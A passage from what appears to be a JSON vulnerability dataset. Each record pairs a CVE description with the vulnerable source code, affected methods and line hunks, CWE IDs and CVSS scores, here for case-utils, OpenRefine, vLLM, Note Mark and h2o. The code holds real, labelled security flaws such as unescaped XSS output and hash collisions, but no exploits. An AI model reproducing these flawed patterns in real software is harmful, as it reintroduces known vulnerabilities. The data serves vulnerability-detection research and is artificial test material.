      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 60,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.0\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            DeprecationWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\"\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\"\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers in sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, an environment variable must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            DeprecationWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\"\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\"\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 88,
          "content": "        try:"
        },
        {
          "line_no": 94,
          "content": "        except ValueError:"
        },
        {
          "line_no": 95,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 96,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 1260,
    "cve": "CVE-2024-47882",
    "description": "OpenRefine is a free, open source tool for working with messy data. Prior to version 3.8.3, the built-in \"Something went wrong!\" error page includes the exception message and exception traceback without escaping HTML tags, enabling injection into the page if an attacker can reliably produce an error with an attacker-influenced message. It appears that the only way to reach this code in OpenRefine itself is for an attacker to somehow convince a victim to import a malicious file, which may be difficult.  However, out-of-tree extensions may add their own calls to `respondWithErrorPage`. Version 3.8.3 has a fix for this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/core/src/main/java/com/google/refine/commands/HttpUtilities.java",
          "content": "/*******************************************************************************\n * Copyright (C) 2018, OpenRefine contributors\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n * \n * 1. Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n * \n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n * \n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n ******************************************************************************/\n\npackage com.google.refine.commands;\n\nimport java.io.IOException;\nimport java.io.Writer;\nimport java.util.Map;\nimport java.util.Properties;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport org.apache.commons.lang3.exception.ExceptionUtils;\nimport org.apache.velocity.VelocityContext;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport com.google.refine.RefineServlet;\nimport com.google.refine.util.ParsingUtilities;\n\n/**\n * @deprecated deprecated for v3.8. All methods have been deprecated and this class will be removed. Most users should\n *             be extending {@link Command} to get access to this functionality.\n */\n@Deprecated\nabstract public class HttpUtilities {\n\n    final static protected Logger logger = LoggerFactory.getLogger(\"command\");\n\n    @Deprecated\n    static public void respond(HttpServletResponse response, String content)\n            throws IOException, ServletException {\n\n        response.setCharacterEncoding(\"UTF-8\");\n        response.setStatus(HttpServletResponse.SC_OK);\n        Writer w = response.getWriter();\n        if (w != null) {\n            w.write(content);\n            w.flush();\n            w.close();\n        } else {\n            throw new ServletException(\"response returned a null writer\");\n        }\n    }\n\n    @Deprecated\n    static public void respond(HttpServletResponse response, String status, String message)\n            throws IOException {\n        // FIXME: This is the only place that uses status instead of code\n        if (message == null) {\n            respondJSON(response, Map.of(\"status\", status));\n        } else {\n            respondJSON(response, Map.of(\n                    \"status\", status,\n                    \"message\", message));\n        }\n    }\n\n    /**\n     * @deprecated deprecated for v3.8. No internal uses. Move to {@link Command} when deprecation period expires.\n     */\n    @Deprecated\n    static public void respondJSON(HttpServletResponse response, Object o)\n            throws IOException {\n\n        respondJsonInternal(response, o);\n    }\n\n    /**\n     * TODO: options parameter is ignored here, but it's always empty in the only place it's used. DRY up\n     *\n     * @deprecated deprecated for v3.8. No internal uses. Move to {@link Command} when deprecation period expires.\n     */\n    @Deprecated\n    static public void respondJSON(\n            HttpServletResponse response, Object o, Properties options)\n            throws IOException {\n\n        respondJsonInternal(response, o);\n    }\n\n    // TODO: This can be inlined with 2-parameter method when 3-param is removed\n    static private void respondJsonInternal(\n            HttpServletResponse response, Object o)\n            throws IOException {\n\n        response.setCharacterEncoding(\"UTF-8\");\n        response.setHeader(\"Content-Type\", \"application/json\");\n\n        Writer w = response.getWriter();\n        ParsingUtilities.defaultWriter.writeValue(w, o);\n        w.flush();\n        w.close();\n    }\n\n    /**\n     * @deprecated deprecated for v3.8. No internal uses.\n     */\n    @Deprecated\n    static public void respondException(HttpServletResponse response, Exception e)\n            throws IOException, ServletException {\n\n        logger.warn(\"Exception caught\", e);\n\n        if (response == null) {\n            throw new ServletException(\"Response object can't be null\");\n        }\n        // TODO: We would like to return an HTTP error here, but front end needs scrubbing first to\n        // to make sure everywhere can handle it. There are known issues with things like the IllegalArgumentException\n        // used for bad regexps\n//        response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n        respondJSON(response, Map.of(\n                \"code\", \"error\", // respondStatus() above uses status instead of code\n                \"message\", e.getMessage(),\n                \"stack\", ExceptionUtils.getStackTrace(e)));\n    }\n\n    /**\n     * @deprecated deprecated for v3.8. No internal uses.\n     */\n    @Deprecated\n    static public void redirect(HttpServletResponse response, String url) throws IOException {\n        response.sendRedirect(url);\n    }\n\n    /**\n     * @deprecated deprecated for v3.8. No internal uses. There is an implementation in\n     *             {@link Command#getIntegerParameter(HttpServletRequest, String, int)} for commands which need it.\n     */\n    @Deprecated\n    static public int getIntegerParameter(HttpServletRequest request, String name, int def) {\n        if (request == null) {\n            throw new IllegalArgumentException(\"parameter 'request' should not be null\");\n        }\n        try {\n            return Integer.parseInt(request.getParameter(name));\n        } catch (Exception e) {\n            logger.warn(\"Error getting integer parameter\", e);\n        }\n        return def;\n    }\n\n    /**\n     * @deprecated deprecated for v3.8. No internal uses other than call from {@link Command} where this implementation\n     *             can be moved when deprecation period expires.\n     */\n    @Deprecated\n    static public void respondWithErrorPage(\n            RefineServlet servlet,\n            HttpServletRequest request,\n            HttpServletResponse response,\n            String message,\n            Throwable e) {\n        // TODO: Move implementation to {@link Command} when deprecation period expires\n        respondWithErrorPage(servlet, request, response, message,\n                HttpServletResponse.SC_INTERNAL_SERVER_ERROR, e);\n    }\n\n    /**\n     * @deprecated deprecated for v3.8. Only internal use is invocation directly above\n     */\n    @Deprecated\n    static public void respondWithErrorPage(\n            RefineServlet servlet,\n            HttpServletRequest request,\n            HttpServletResponse response,\n            String message,\n            int status,\n            Throwable e) {\n        // TODO: Move implementation to {@link Command} when deprecation period expires\n        VelocityContext context = new VelocityContext();\n\n        context.put(\"message\", message);\n        context.put(\"stack\", e == null ? \"\" : ExceptionUtils.getStackTrace(e));\n\n        try {\n            response.setStatus(status);\n\n            servlet.getModule(\"core\").sendTextFromTemplate(\n                    request, response, context, \"error.vt\", \"UTF-8\", \"text/html\", true);\n\n        } catch (Exception e1) {\n            logger.error(\"Error processing Velocity template\", e1);\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Deprecated\n    static public void respondWithErrorPage(\n            RefineServlet servlet,\n            HttpServletRequest request,\n            HttpServletResponse response,\n            String message,\n            int status,\n            Throwable e) {\n        // TODO: Move implementation to {@link Command} when deprecation period expires\n        VelocityContext context = new VelocityContext();\n\n        context.put(\"message\", message);\n        context.put(\"stack\", e == null ? \"\" : ExceptionUtils.getStackTrace(e));\n\n        try {\n            response.setStatus(status);\n\n            servlet.getModule(\"core\").sendTextFromTemplate(\n                    request, response, context, \"error.vt\", \"UTF-8\", \"text/html\", true);\n\n        } catch (Exception e1) {\n            logger.error(\"Error processing Velocity template\", e1);\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 200,
          "content": "        context.put(\"stack\", e == null ? \"\" : ExceptionUtils.getStackTrace(e));"
        }
      ]
    },
    "cwe": [
      "CWE-81",
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.9,
    "cvss_version": 3.1
  },
  {
    "id": 163,
    "cve": "CVE-2025-46722",
    "description": "vLLM is an inference and serving engine for large language models (LLMs). In versions starting from 0.7.0 to before 0.9.0, in the file vllm/multimodal/hasher.py, the MultiModalHasher class has a security and data integrity issue in its image hashing method. Currently, it serializes PIL.Image.Image objects using only obj.tobytes(), which returns only the raw pixel data, without including metadata such as the image’s shape (width, height, mode). As a result, two images of different sizes (e.g., 30x100 and 100x30) with the same pixel byte sequence could generate the same hash value. This may lead to hash collisions, incorrect cache hits, and even data leakage or security risks. This issue has been patched in version 0.9.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "vllm/multimodal/hasher.py",
          "content": "# SPDX-License-Identifier: Apache-2.0\n\nimport pickle\nfrom collections.abc import Iterable, Mapping\nfrom typing import TYPE_CHECKING, Optional\n\nimport numpy as np\nimport torch\nfrom blake3 import blake3\nfrom PIL import Image\n\nfrom vllm.logger import init_logger\n\nif TYPE_CHECKING:\n    from vllm.inputs import TokensPrompt\n\nlogger = init_logger(__name__)\n\nMultiModalHashDict = Mapping[str, list[str]]\n\"\"\"\nA dictionary containing hashes for items in each modality.\n\"\"\"\n\n\nclass MultiModalHasher:\n\n    @classmethod\n    def serialize_item(cls, obj: object) -> bytes:\n        # Simple cases\n        if isinstance(obj, str):\n            return obj.encode(\"utf-8\")\n        if isinstance(obj, bytes):\n            return obj\n        if isinstance(obj, Image.Image):\n            return obj.tobytes()\n\n        # Convertible to NumPy arrays\n        if isinstance(obj, torch.Tensor):\n            obj = obj.numpy()\n        if isinstance(obj, (int, float)):\n            obj = np.array(obj)\n        if isinstance(obj, np.ndarray):\n            return obj.tobytes()\n\n        logger.warning(\n            \"No serialization method found for %s. \"\n            \"Falling back to pickle.\", type(obj))\n\n        return pickle.dumps(obj)\n\n    @classmethod\n    def item_to_bytes(\n        cls,\n        key: str,\n        obj: object,\n    ) -> Iterable[tuple[bytes, bytes]]:\n        # Recursive cases\n        if isinstance(obj, (list, tuple)):\n            for i, elem in enumerate(obj):\n                yield from cls.item_to_bytes(f\"{key}.{i}\", elem)\n        elif isinstance(obj, dict):\n            for k, v in obj.items():\n                yield from cls.item_to_bytes(f\"{key}.{k}\", v)\n        else:\n            key_bytes = cls.serialize_item(key)\n            value_bytes = cls.serialize_item(obj)\n            yield key_bytes, value_bytes\n\n    @classmethod\n    def hash_kwargs(cls, **kwargs: object) -> str:\n        hasher = blake3()\n\n        for k, v in kwargs.items():\n            for k_bytes, v_bytes in cls.item_to_bytes(k, v):\n                hasher.update(k_bytes)\n                hasher.update(v_bytes)\n\n        return hasher.hexdigest()\n\n    @classmethod\n    def hash_prompt_mm_data(\n            cls, prompt: \"TokensPrompt\") -> Optional[\"MultiModalHashDict\"]:\n        \"\"\"Hash multimodal data in the user input prompt if they exist.\"\"\"\n\n        if \"multi_modal_data\" not in prompt:\n            return None\n\n        mm_data = prompt[\"multi_modal_data\"]\n        if not mm_data:\n            # mm_data can be None or an empty dict.\n            return None\n\n        mm_items = {\n            modality: items if isinstance(items, list) else [items]\n            for modality, items in mm_data.items()\n        }\n\n        mm_hashes = {\n            modality: [cls.hash_kwargs(**{modality: item}) for item in items]\n            for modality, items in mm_items.items()\n        }\n\n        return mm_hashes\n"
        }
      ],
      "method_level": [
        "def serialize_item(cls, obj: object) -> bytes:\n        # Simple cases\n        if isinstance(obj, str):\n            return obj.encode(\"utf-8\")\n        if isinstance(obj, bytes):\n            return obj\n        if isinstance(obj, Image.Image):\n            return obj.tobytes()\n\n        # Convertible to NumPy arrays\n        if isinstance(obj, torch.Tensor):\n            obj = obj.numpy()\n        if isinstance(obj, (int, float)):\n            obj = np.array(obj)\n        if isinstance(obj, np.ndarray):\n            return obj.tobytes()\n\n        logger.warning(\n            \"No serialization method found for %s. \"\n            \"Falling back to pickle.\", type(obj))\n\n        return pickle.dumps(obj)",
        "def item_to_bytes(\n        cls,\n        key: str,\n        obj: object,\n    ) -> Iterable[tuple[bytes, bytes]]:\n        # Recursive cases\n        if isinstance(obj, (list, tuple)):\n            for i, elem in enumerate(obj):\n                yield from cls.item_to_bytes(f\"{key}.{i}\", elem)\n        elif isinstance(obj, dict):\n            for k, v in obj.items():\n                yield from cls.item_to_bytes(f\"{key}.{k}\", v)\n        else:\n            key_bytes = cls.serialize_item(key)\n            value_bytes = cls.serialize_item(obj)\n            yield key_bytes, value_bytes",
        "def hash_kwargs(cls, **kwargs: object) -> str:\n        hasher = blake3()\n\n        for k, v in kwargs.items():\n            for k_bytes, v_bytes in cls.item_to_bytes(k, v):\n                hasher.update(k_bytes)\n                hasher.update(v_bytes)\n\n        return hasher.hexdigest()"
      ],
      "hunk_level": [
        {
          "line_no": 34,
          "content": "        if isinstance(obj, Image.Image):"
        },
        {
          "line_no": 35,
          "content": "            return obj.tobytes()"
        },
        {
          "line_no": 37,
          "content": "        # Convertible to NumPy arrays"
        },
        {
          "line_no": 39,
          "content": "            obj = obj.numpy()"
        },
        {
          "line_no": 40,
          "content": "        if isinstance(obj, (int, float)):"
        },
        {
          "line_no": 41,
          "content": "            obj = np.array(obj)"
        },
        {
          "line_no": 43,
          "content": "            return obj.tobytes()"
        },
        {
          "line_no": 60,
          "content": "                yield from cls.item_to_bytes(f\"{key}.{i}\", elem)"
        },
        {
          "line_no": 63,
          "content": "                yield from cls.item_to_bytes(f\"{key}.{k}\", v)"
        },
        {
          "line_no": 74,
          "content": "            for k_bytes, v_bytes in cls.item_to_bytes(k, v):"
        }
      ]
    },
    "cwe": [
      "CWE-1288",
      "CWE-1023"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.2,
    "cvss_version": 3.1
  },
  {
    "id": 1013,
    "cve": "CVE-2024-41819",
    "description": "Note Mark is a web-based Markdown notes app. A stored cross-site scripting (XSS) vulnerability in Note Mark allows attackers to execute arbitrary web scripts via a crafted payload injected into the URL value of a link in the markdown content. This vulnerability is fixed in 0.13.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "frontend/src/core/renderer.ts",
          "content": "import DOMPurify from 'dompurify';\n\nimport { markdown_to_html } from '../../renderer/pkg';\n// Render markdown into HTML,\n// will sanitize input to prevent possible XSS attacks\nfunction render(content: string): string {\n  content = DOMPurify.sanitize(content)\n  return markdown_to_html(content)\n}\n\nexport default render\n"
        }
      ],
      "method_level": [
        "render"
      ],
      "hunk_level": [
        {
          "line_no": 7,
          "content": "  content = DOMPurify.sanitize(content)"
        },
        {
          "line_no": 8,
          "content": "  return markdown_to_html(content)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 1227,
    "cve": "CVE-2024-45397",
    "description": "h2o is an HTTP server with support for HTTP/1.x, HTTP/2 and HTTP/3. When an HTTP request using TLS/1.3 early data on top of TCP Fast Open or QUIC 0-RTT packets is received and the IP-address-based access control is used, the access control does not detect and prohibit HTTP requests conveyed by packets with a spoofed source address. This behavior allows attackers on the network to execute HTTP requests from addresses that are otherwise rejected by the address-based access control. The vulnerability has been addressed in commit 15ed15a. Users may disable the use of TCP FastOpen and QUIC to mitigate the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "share/h2o/mruby/acl.rb",
          "content": "# Copyright (c) 2016 DeNA Co., Ltd., Ichito Nagata\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to\n# deal in the Software without restriction, including without limitation the\n# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n# sell copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\n# IN THE SOFTWARE.\n#\nrequire File.expand_path(File.dirname(__FILE__)) + \"/bootstrap.rb\"\n\nmodule H2O\n\n  module ACL\n\n    def acl(&block)\n      context = H2O::ConfigurationContext.instance\n      if context.get_value(:acl_handler) then\n        raise \"acl can be called only once for each handler configuration\"\n      end\n      acl_handler = ACLHandler.new(&block)\n      context.set_value(:acl_handler, acl_handler)\n      context.add_post_handler_generation_hook(proc {|handler|\n        if handler != acl_handler\n          raise \"acl configuration is ignored\"\n        end\n      })\n      return acl_handler\n    end\n\n    class ACLHandler\n\n      class ConditionalHandler\n        def initialize(handler, cond)\n          @handler = handler\n          @cond = cond\n        end\n\n        def satisfy?(env)\n           return @cond.nil? || MatchingBlock.new(env).instance_eval(&@cond)\n        end\n\n        def call(env)\n          return @handler.call(env) if satisfy?(env)\n          return [399, {}, []]\n        end\n      end\n\n      def initialize(&block)\n        @acl = []\n        instance_eval(&block)\n      end\n\n      def call(env)\n        @acl.each {|ac|\n          return ac.call(env) if ac.satisfy?(env)\n        }\n        return [399, {}, []]\n      end\n\n      def use(handler, &cond)\n        ch = ConditionalHandler.new(handler, cond)\n        @acl << ch\n      end\n\n      def respond(status, header={}, body=[], &cond)\n        use(proc {|env| [status, header, body] }, &cond)\n      end\n\n      def deny(&cond)\n        respond(403, {}, [\"Forbidden\"], &cond)\n      end\n\n      def allow(&cond)\n        respond(399, {}, [], &cond)\n      end\n\n      def redirect(location, status=302, &cond)\n        respond(status, { \"Location\" => location }, [], &cond)\n      end\n\n      class MatchingBlock\n        def initialize(env)\n          @env = env\n        end\n\n        def addr(forwarded=true)\n          addr = @env['REMOTE_ADDR']\n          if forwarded && (xff = @env['HTTP_X_FORWARDED_FOR'])\n            xaddr = xff.split(\",\")[0]\n            addr = xaddr if xaddr\n          end\n          return addr || \"\"\n        end\n\n        def path\n          return @env[\"PATH_INFO\"] || \"\"\n        end\n\n        def method\n          return @env[\"REQUEST_METHOD\"] || \"\"\n        end\n\n        def header(name)\n          name = 'HTTP_' + name.gsub(/-/, '_').upcase;\n          return @env[name] || \"\"\n        end\n\n        def user_agent\n          return header(\"User-Agent\") || \"\"\n        end\n\n      end\n\n    end\n\n  end\n\nend\n"
        }
      ],
      "method_level": [
        "def call(env)\n        @acl.each {|ac|\n          return ac.call(env) if ac.satisfy?(env)\n        }\n        return [399, {}, []]\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "        @acl.each {|ac|"
        },
        {
          "line_no": 67,
          "content": "          return ac.call(env) if ac.satisfy?(env)"
        },
        {
          "line_no": 68,
          "content": "        }"
        }
      ]
    },
    "cwe": [
      "CWE-290",
      "CWE-284"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.9,
    "cvss_version": 3.1
  },
  {
    "id": 86,
    "cve": "CVE-2024-22191",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. A stored cross-site scripting (XSS) vulnerability was found in the key_value field of Avo v3.2.3 and v2.46.0. This vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser. The value of the key_value is inserted directly into the HTML code. In the current version of Avo (possibly also older versions), the value is not properly sanitized before it is inserted into the HTML code. This vulnerability could be used to steal sensitive information from victims that could be used to hijack victims' accounts or redirect them to malicious websites. Avo 3.2.4 and 2.47.0 include a fix for this issue. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
